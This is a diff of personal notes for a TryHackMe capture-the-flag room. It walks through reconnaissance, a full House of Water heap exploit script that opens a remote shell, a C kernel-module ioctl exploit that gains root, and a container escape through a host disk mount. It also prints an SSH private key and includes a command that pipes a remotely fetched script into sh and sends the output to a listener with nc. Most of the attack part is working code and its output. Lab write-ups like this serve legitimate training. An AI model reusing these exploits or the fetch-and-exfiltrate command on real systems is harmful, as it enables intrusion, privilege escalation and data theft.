@@ -3,9 +3,9 @@
 --------------------------------------
 
 |================================================================
-- Name: bb21200fff81 
-- IP Address: 10.66.181.190
-- OS: Ubuntu 22.04.5 LTS / x64
+- Name: tryhackme
+- IP Address: 10.64.170.226
+- OS: Ubuntu 24.04.1 LTS / x64
 - Notes: 
 
 //CREDS:
@@ -16,7 +16,7 @@
 	THM{Welcom3_to_th3_eastmass_pwnland}
 	THM{byp4ss_and_pack_is_pwn_you_n33d}
 	THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
-
+	THM{final-boss_defeat3d-yay}
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -30,9 +30,9 @@
 
 //Whether he planned sabotage, rebellion, or something far stranger remains unknown because no analyst has managed to look inside. All that is certain is that Hopper guards this secret with a wild grin and a mind that slips further away each day. The question is now: Can you prove he is wrong, or get lost in his madness?
 
-ip=10.66.181.190
+ip=10.64.170.226
 
-Visit: http://$ip:21337/
+Visit: firefox-esr http://$ip:21337/
 Memory Key: tit_for_tat
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -112,6 +112,28 @@ feroxbuster -k -u http://10.67.177.30/ -w /usr/share/dirb/wordlists/big.txt --sc
 //There does not seem to be anything on the web application at port 80. However, fuzzing it for directories, we can quickly discover the /dev endpoint.
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 9004/tcp	unknown 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Try a nc connection
+nc -nv $ip 9004
+
+(UNKNOWN) [10.67.177.30] 9004 (?) open
+Payload Storage Malhare's
+Version 4.2.0
+[1] C:
+[2] U:
+[3] D:
+[4] E:
+>>
+
+//Checking the service on port 9004, we get a menu with a couple of options but nothing clear on what can be done.
+
+// Use HouseOfWater exploit to get shell into a Docker container
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -275,14 +297,14 @@ Host: localhost
 Connection: close
 
 //Visit Page
-http://10.67.177.30/7ln6Z1X9EF/
+http://10.66.169.4/7ln6Z1X9EF/
 
 //Files on page
 	4.2.0-R1-1337-server.zip
 	foothold.txt
 
 //Pull Files
-wget http://10.67.177.30/7ln6Z1X9EF/4.2.0-R1-1337-server.zip
+wget http://10.66.169.4/7ln6Z1X9EF/4.2.0-R1-1337-server.zip
 
 unzip -l 4.2.0-R1-1337-server.zip
 Archive:  4.2.0-R1-1337-server.zip
@@ -380,16 +402,16 @@ LAB_001015f7:
   }
   if (iVar1 < 5) {
     if (iVar1 == 3) {
-//      delete();
+    	delete();
       goto LAB_001015f7;
     }
     if (iVar1 < 4) {
       if (iVar1 == 1) {
-//        create();
+      	create();
       }
       else {
         if (iVar1 != 2) goto LAB_00101671;
-//        update();
+        	update();
       }
       goto LAB_001015f7;
     }
@@ -400,6 +422,10 @@ LAB_00101671:
 }
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+[1] C: → create()   → malloc a chunk
+[2] U: → update()   → write to a chunk
+[3] D: → delete()   → free a chunk (but doesn’t clear it → UAF)
+[4] E: → exit()     → quits the program
 
 //Inspecting the create function, we can see that it simply prompts the user for a size, allocates memory using malloc with that size, stores the resulting pointer in the chunks array, and records the size in the sizes array.
 
@@ -507,42 +533,46 @@ undefined8 delete(void)
 ## Leakless Heap Exploitation - The House of Water
 https://corgi.rip/posts/leakless_heap_1/
 
+//The House of Water is a heap exploitation technique developed by Blue Water player udp and was initially showcased in the PotluckCTF 2023 challenge Tamagoyaki. It gives you control of the tcache_perthread_struct while also placing a libc pointer in its entries section, which with some continued wizardry is enough to get the program to spawn a shell!
 
-[1] C: → create()   → malloc a chunk
-[2] U: → update()   → write to a chunk
-[3] D: → delete()   → free a chunk (but doesn’t clear it → UAF)
-[4] E: → exit()     → quits the program
+###House of Water info
+This is a heap exploitation, referring to a specific heap exploitation technique targeting the tcache freelist in glibc (commonly used in Linux).
 
+"House of Water" is one of the many "House of X" heap exploitation techniques, like:
+	-House of Force
+	-House of Spirit
+	-House of Orange
+
+The House of Water typically involves tcache poisoning, a method of corrupting the tcache freelist to control where memory is allocated.
+
+It’s often used for Use-After-Free (UAF) or arbitrary malloc control.
+
+###UAF
+Use-After-Free – A common memory corruption vulnerability where a program continues to use a pointer after the memory it points to has been freed.
+
+This can be exploited to achieve RCE or escalate privileges, especially in heap-based exploits.
 
 // House of Water PoC
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
 git clone https://github.com/corgeman/leakless_research.git
 
-cd leakless_research/part_1
-
 //Download python virtual env
 sudo apt install python3-venv
 
 //Create virtual env
-python3 -m venv SideQuest2
+python3 -m venv HouseOfWater_PoC
 
 # Activate the environment
-source SideQuest2/bin/activate
+source HouseOfWater_PoC/bin/activate
 
 //Needs pwntools library
 pip install pwn
 
-//Location
-/home/kali/haxterm/data/SideQuest2/leakless_research/part_1
-
-//For the RCE portion of the exploit, we also need the io_file.py file from the same repository.
-
-//Now, with everything in place, we can run the exploit and see that we successfully obtain a shell inside a Docker container and can read the third flag inside user.txt.
-
-//For the RCE portion of the exploit, we also need the io_file.py file from the same repository.
+//For the actual exploit, we can simply modify the PoC shared by the article’s author. There is one caveat, however: the PoC includes functionality to leak two ASLR-affected nibbles, which we do not have. We therefore need to modify the script to brute-force these bytes instead, like so:
 
 // *Exploit* (solve.py)
+// Make sure to change remote IP address
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 #!/usr/bin/env python3
 
@@ -550,43 +580,142 @@ from pwn import *
 import io_file
 
 context.update(arch="amd64", os="linux", log_level="error")
-context.binary = elf = ELF("/home/kali/haxterm/data/SideQuest2/server", checksec=False)
-libc = ELF("/home/kali/haxterm/data/SideQuest2/libc.so.6", checksec=False)
+context.binary = elf = ELF("./server", checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
 
 exit_addr = libc.sym['exit']
 stdout_addr = libc.sym['_IO_2_1_stdout_']
 
 for heap_brute in range(16):
-    for libc_brute in range(16):
-        try:
-            print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
+	for libc_brute in range(16):
+		try:
+			print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
+		
+			r = remote("10.66.169.4", 9004)		
 
-            r = remote("10.66.181.190", 9004)
+			idx = -1
 
+			def create(size):
+				global idx
+				idx = idx+1
+				r.sendlineafter(b'\n>>', b'1')
+				r.sendlineafter(b'size: \n', str(size).encode())
+				return idx
+
+			def update(index, data, offset=0):
+				r.sendlineafter(b'\n>>', b'2')
+				r.sendlineafter(b'idx:\n', str(index).encode())
+				r.sendlineafter(b'offset:\n', str(offset).encode())
+				r.sendafter(b'data:\n', data)
+
+			def delete(index):
+				r.sendlineafter(b'\n>>', b'3')
+				r.sendlineafter(b'idx:\n', str(index).encode())
+
+			for _ in range(7):
+				create(0x90-8) 
+
+			middle = create(0x90-8)
+
+			playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
+			guard = create(0x18) 
+			delete(playground)
+			guard = create(0x18)
+
+			corruptme = create(0x4c8)
+			start_M = create(0x90-8)
+			midguard = create(0x28) 
+			end_M = create(0x90-8)
+			leftovers = create(0x28)
+				
+			update(playground,p64(0x651),0x18)
+			delete(corruptme)
+
+			offset = create(0x4c8+0x10) 
+			start = create(0x90-8)
+			midguard = create(0x28)
+			end = create(0x90-8)
+			leftovers = create(0x18)
+
+			create((0x10000+0x80)-0xda0-0x18)
+			fake_data = create(0x18)
+			update(fake_data,p64(0x10000)+p64(0x20)) 
+
+			fake_size_lsb = create(0x3d8);
+			fake_size_msb = create(0x3e8);
+			delete(fake_size_lsb)
+			delete(fake_size_msb)
+
+
+			update(playground,p64(0x31),0x4e8)
+			delete(start_M)
+			update(start_M,p64(0x91),8)
+
+			update(playground,p64(0x21),0x5a8)
+			delete(end_M)
+			update(end_M,p64(0x91),8)
+
+			for i in range(7):
+				delete(i)
+
+			delete(end)
+			delete(middle)
+			delete(start)
+
+			heap_target = (heap_brute << 12) + 0x80
+			update(start,p16(heap_target))
+			update(end,p16(heap_target),8)
+			exit_lsb = (libc_brute << 12) + (exit_addr & 0xfff) 
+			stdout_offset = stdout_addr - exit_addr
+			stdout_lsb = (exit_lsb + stdout_offset) & 0xffff
+			print(f"{heap_target=:#x}, {stdout_lsb=:#x}")
+
+			win = create(0x888) 
+			
+			update(win,p16(stdout_lsb),8) 
+			stdout = create(0x28)
+			update(stdout,p64(0xfbad3887)+p64(0)*3+p8(0))
+			
+			libc_leak = u64(r.recv(8))
+			libc.address = libc_leak - (stdout_addr+132)
+			print(f"possible libc leak = {libc.address:#x}")
+			
+			file = io_file.IO_FILE_plus_struct() 
+			payload = file.house_of_apple2_execmd_when_do_IO_operation(
+				libc.sym['_IO_2_1_stdout_'],
+				libc.sym['_IO_wfile_jumps'],
+				libc.sym['system'])
+			update(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
+			full_stdout = create(0x3e0-8)
+			update(full_stdout,payload)
+
+			r.interactive("$ ")
+			exit()
+
+		except Exception as e:
+			print(e)
+			continue
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+//For the RCE portion of the exploit, we also need the io_file.py file from the same repository. The script looks for it.
 
+//Copy the io_file.py back out to main SideQuest2 directory
+cp leakless_research/part_1/io_file.py /home/kali/haxterm/data/SideQuest2
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+//Lets now run the expoit and see if we get a shell!!!
 
-
-// Fourth Flag
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
-2026-01-03 06:33:11 EST -- 
+2026-01-04 17:34:26 EST -- 
 python3 solve.py 
 
-//Now, with everything in place, we can run the exploit and see that we successfully obtain a shell inside a Docker container and can read the third flag inside user.txt.
-
+//Took a couple minutes to bruteforce
+//NOTE: If it doesn't work check ip/port in server.py and run again
 
 id
 uid=0(root) gid=0(root) groups=0(root)
 
-cat user.txt
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-//THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
 
 cat /etc/*elease
 PRETTY_NAME="Ubuntu 22.04.5 LTS"
@@ -597,16 +726,32 @@ Linux bb21200fff81 6.14.0-1017-aws #17~24.04.1-Ubuntu SMP Wed Nov  5 10:48:17 UT
 hostname
 bb21200fff81
 
-cd /home/srv
+pwd
+/home/srv
 
--rwxrwxrwx 1 root root  411 Dec  2 06:11 id_rsa
--rwxrwxrwx 1 root root   97 Dec  2 06:11 id_rsa.pub
--rwxrwxr-x 1 root root 804K Dec  2 02:44 ld-linux-x86-64.so.2
--rwxrwxr-x 1 root root 6.1M Dec  2 02:44 libc.so.6
--rwxrwxr-x 1 root root  25K Dec  2 04:30 server
--rwxrwxr-x 1 root root   51 Dec  2 07:35 user.txt
+ls -la
+-rwxrwxrwx 1 root root     411 Dec  2 06:11 id_rsa
+-rwxrwxrwx 1 root root      97 Dec  2 06:11 id_rsa.pub
+-rwxrwxr-x 1 root root  822280 Dec  2 02:44 ld-linux-x86-64.so.2
+-rwxrwxr-x 1 root root 6342160 Dec  2 02:44 libc.so.6
+-rwxrwxr-x 1 root root   24601 Dec  2 04:30 server
+-rwxrwxr-x 1 root root      51 Dec  2 07:35 user.txt
 
-//cat id_rsa
+ps -ef
+UID          PID    PPID  C STIME TTY          TIME CMD
+root           1       0  0 21:39 ?        00:00:00 socat tcp-l:9004,reuseaddr,fork EXEC:./server
+
+//It seems this shell is inside a Docker container. Notice how PID 1 is not systemd or init, but something like an app or shell
+//NOTE: Another Test
+test -f /.dockerenv && echo "Running in Docker"
+
+//Lets read the third flag inside user.txt.
+cat user.txt
+
+//THM{theres_someth1g_in_th3_w4t3r_that_cannot_l3ak}
+
+//Copy over id_rsa and id_rsa.pub for intel
+cat id_rsa
 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
@@ -616,10 +761,20 @@ AAAECuFWeJq3xX3/SaKB3EPHBPWUCB46sAj6ewL623eVpaMNrUEbTDkcpAuYGW1sN4OTd5
 7ZvSxXIWq7kv9XiOVKs9AAAAD2FnZW50QHRyeWhhY2ttZQECAwQFBg==
 -----END OPENSSH PRIVATE KEY-----
 
-cat id_rsa.pub 
+cat id_rsa.pub
+
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINrUEbTDkcpAuYGW1sN4OTd57ZvSxXIWq7kv9XiOVKs9 agent@tryhackme
 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Fourth Flag
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Apart from the flag, we also have an SSH key pair with the agent username shown in the public key comment.
+
 //Lets login with these creds
+2026-01-04 18:19:55 EST -- 
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa agent@$ip
 Warning: Permanently added '10.66.181.190' (ED25519) to the list of known hosts.
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -631,47 +786,319 @@ This private key will be ignored.
 Load key "id_rsa": bad permissions
 agent@10.66.181.190: Permission denied (publickey).
 
-
+//Need to close the privs on the private key a bit
 chmod 600 id_rsa
+
+2026-01-04 18:20:55 EST -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa agent@$ip
+
+id
+uid=1001(agent) gid=1001(agent) groups=1001(agent),100(users
 
 //SUCCESS login
 
-egrep '/bin/(bash|sh|zsh)$' /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
-agent:x:1001:1001:,,,:/home/agent:/bin/bash
+hostname
+tryhackme
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+uname -a
+Linux tryhackme 6.14.0-1017-aws #17~24.04.1-Ubuntu SMP Wed Nov  5 10:48:17 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+
+cat /etc/*elease
+PRETTY_NAME="Ubuntu 24.04.1 LTS"
+
+sudo -ll
+Matching Defaults entries for agent on tryhackme:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User agent may run the following commands on tryhackme:
+
+Sudoers entry: /etc/sudoers
+    RunAsUsers: root
+    Options: !authenticate
+    Commands:
+        /usr/sbin/modprobe -r kagent
+        /usr/sbin/modprobe kagent
+
+Sudoers entry: /etc/sudoers
+    RunAsUsers: root
+    Options: !authenticate
+    Commands:
+        /bin/chmod 444 /dev/kagent
+
+//Checking the sudo permissions for our user, we can see that we are allowed to load/unload the kagent module and also give everyone read permissions on the /dev/kagent device.
+
+//Summary of sudo privs
+sudo /usr/sbin/modprobe kagent
+sudo /usr/sbin/modprobe -r kagent
+sudo /bin/chmod 444 /dev/kagent
 
 
+// PRIV ESC
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Checking installed modules, we can see that kagent is already loaded.
+
+lsmod | egrep kagent
+kagent                 12288  0
+
+//Find kagent.ko current modprobe path
+
+modinfo -n kagent
+/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
+
+ls -lah /lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
+-r--r--r-- 1 root root 362K Dec  4 15:00 /lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
 
 
-// 9004/tcp	unknown 
+find / -iname "kagent.ko" 2>/dev/null
+/usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
+
+ls -lah /usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
+-r--r--r-- 1 root root 362K Dec  4 15:00 /usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
+
+
+// Privesc -- Linux (linpeas)
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-//Try a nc connection
-nc -nv $ip 9004
+# Local network
+// Install peass
+sudo apt install -y peass
+cp /usr/share/peass/linpeas/linpeas.sh .
 
-(UNKNOWN) [10.67.177.30] 9004 (?) open
-Payload Storage Malhare's
-Version 4.2.0
-[1] C:
-[2] U:
-[3] D:
-[4] E:
->>
+// Download, execute from memory, & save output on kali
+  // KALI term1
+sudo python3 -m http.server 80
+  // KALI term2
+nc -lvnp 443 | tee linpeas_agent.out
 
-//Checking the service on port 9004, we get a menu with a couple of options but nothing clear on what can be done.
+  // CurlTarget
+curl 192.168.190.148:80/linpeas.sh | sh | nc 192.168.190.148 443
 
+// View linpeas output
+less -R linpeas_agent.out
 
+// LOOT
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+══╣ Users with UID 0 in /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ Users with console
+agent:x:1001:1001:,,,:/home/agent:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+// Exploit Way
+//https://github.com/djalilayed/tryhackme/blob/main/Advent_of_Cyber_Side_Quest_2025/Scheme_Catcher/exploit.c
+
+//exploit.c
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+ /* =========================================
+ Script by Gemini and Claudi AI
+ Leaking key hint by Jaxafed https://jaxafed.github.io/posts/tryhackme-aoc2025_sidequest_two/
+ script for tryhackme room Scheme Catcher https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R
+ YouTube video walk through: https://youtu.be/x_s0IofEiAQ
+
+    ========================================= */
 
 
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string.h>
+
+#define CMD_GET_STATUS  0xc0b33701
+#define CMD_LOAD_VAL    0x40933702
+#define CMD_EXECUTE     0x133703
+
+int main(int argc, char **argv) {
+    printf("[*] Starting Dynamic Zero-Knowledge Exploit...\n");
+
+    int fd = open("/dev/kagent", O_RDONLY);
+    if (fd < 0) { perror("open"); return 1; }
+
+    /* =========================================
+       STEP 1: LEAK (Send 'A's)
+       ========================================= */
+    uint8_t buf[512];
+    memset(buf, 'A', 16);      
+    memset(buf + 16, 0, 496); 
+    
+    printf("[*] Sending Heartbeat to leak stack...\n");
+    if (ioctl(fd, CMD_GET_STATUS, buf) < 0) { perror("ioctl leak"); return 1; }
+
+    /* =========================================
+       STEP 2: SCAN & CALCULATE
+       ========================================= */
+    uint64_t leak_ptr = 0;
+    int ptr_offset = -1;
+
+    // Scan for kernel pointer signature (0xffffffff........)
+    for (int i = 0; i < 400; i++) {
+        uint64_t val = *(uint64_t*)(buf + i);
+        if ((val & 0xffffffff00000000) == 0xffffffff00000000 && val != 0xffffffffffffffff) {
+            leak_ptr = val;
+            ptr_offset = i;
+            printf("[+] Found Kernel Pointer at offset %d: 0x%lx\n", i, val);
+            break;
+        }
+    }
+
+    if (ptr_offset == -1) {
+        printf("[-] Could not find kernel pointer.\n");
+        return 1;
+    }
+
+    // CRITICAL FIX: The Key is the 16 bytes BEFORE the pointer
+    int key_offset = ptr_offset - 16;
+    if (key_offset < 0) {
+        printf("[-] Pointer found too early, cannot read key before it.\n");
+        return 1;
+    }
+
+    char session_key[16];
+    memcpy(session_key, buf + key_offset, 16);
+
+    printf("[+] Extracted Session Key from offset %d: ", key_offset);
+    for(int i=0; i<16; i++) printf("%02x", (unsigned char)session_key[i]);
+    printf("\n");
+    
+    // Also try to print it as string if it looks printable
+    char key_str[17] = {0};
+    memcpy(key_str, session_key, 16);
+    printf("[+] Key as String: '%s'\n", key_str);
+
+    /* =========================================
+       STEP 3: CALC TARGET
+       ========================================= */
+    // leak_ptr is 'op_ping'. 
+    // Target 'op_execute' is +0x330 (based on your previous findings) or +0x320 (from Python script)
+    // The Python script used 0x320, but your C analysis said 0x330.
+    // Let's use the offset derived from the module base 0xffffffffc0...000
+    
+    uint64_t module_base = leak_ptr & 0xfffffffffffff000;
+    // Usually op_ping is at base+0x10. So leak_ptr = base+0x10.
+    // op_execute is usually base+0x330.
+    // So target = leak_ptr - 0x10 + 0x330 = leak_ptr + 0x320.
+    
+    uint64_t op_execute = leak_ptr + 0x320; 
+    printf("[+] Calculated op_execute: 0x%lx\n", op_execute);
+
+    /* =========================================
+       STEP 4: SEND PAYLOAD (Offset 48)
+       ========================================= */
+    uint8_t payload[256];
+    memset(payload, 0, sizeof(payload));
+
+    // 1. Session Key (Offset 0)
+    memcpy(payload, session_key, 16);
+
+    // 2. Padding (AgentID + NewKey) = 32 bytes
+    memset(payload + 16, 'B', 32);
+
+    // 3. Target Pointer at Offset 48 (16 + 16 + 16)
+    *(uint64_t*)(payload + 48) = op_execute;
+
+    printf("[*] Sending Payload (Key + Target @ 48)...\n");
+    if (ioctl(fd, CMD_LOAD_VAL, payload) < 0) {
+        perror("[-] Load Failed");
+        // Fallback: Try Offset 0x330 calculation if 0x320 was wrong
+        printf("[!] Retrying with +0x330 offset...\n");
+        *(uint64_t*)(payload + 48) = leak_ptr + 0x330; 
+        if(ioctl(fd, CMD_LOAD_VAL, payload) < 0) {
+             perror("[-] Retry Failed");
+             return 1;
+        }
+    }
+
+    printf("[+] Payload Loaded. Triggering...\n");
+    ioctl(fd, CMD_EXECUTE, 0);
+
+    printf("[*] Spawning Shell (Check UID)...\n");
+    system("id");
+    system("/bin/sh");
+
+    return 0;
+}
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+gcc exploit.c -o exploit
+
+2026-01-05 01:57:43 EST -- 
+./exploit 
+[*] Starting Dynamic Zero-Knowledge Exploit...
+[*] Sending Heartbeat to leak stack...
+[+] Found Kernel Pointer at offset 85: 0xffffffffc0491010
+[+] Extracted Session Key from offset 69: 53757033725333637572334b33792121
+[+] Key as String: 'Sup3rS3cur3K3y!!'
+[+] Calculated op_execute: 0xffffffffc0491330
+[*] Sending Payload (Key + Target @ 48)...
+[+] Payload Loaded. Triggering...
+[*] Spawning Shell (Check UID)...
+uid=0(root) gid=0(root) groups=0(root)
+
+ls /root
+admin_setkey  admin_setkey.c  key.bin  kkey  root.txt  snap
+# cat /root/root.txt
+
+//THM{final-boss_defeat3d-yay}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+## *BONUS(DockerEscape)*
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Once you are able to use HouseOfWater PoC
+//We will have root in a Docker Container
+
+//Look what is mounted for the container
+
+mount
+/dev/nvme0n1p1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
+/dev/nvme0n1p1 on /etc/hostname type ext4 (rw,relatime,discard)
+/dev/nvme0n1p1 on /etc/hosts type ext4 (rw,relatime,discard)
+
+//We have the Read/Write privs
+
+lsblk
+
+nvme0n1     259:0    0    60G  0 disk 
+`-nvme0n1p1 259:1    0    60G  0 part /etc/hosts
+                                      /etc/hostname
+                                      /etc/resolv.conf
+
+//This is a PRIVILEGED privileged container
+mkdir /mnt/host
+
+mount /dev/nvme0n1p1 /mnt/host
+
+ls /mnt/host/root
+admin_setkey
+admin_setkey.c
+key.bin
+kkey
+root.txt
+snap
+
+cat /mnt/host/root/root.txt
+
+//THM{final-boss_defeat3d-yay}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+2026-01-05 03:55:17 EST -- COMPLETE
 
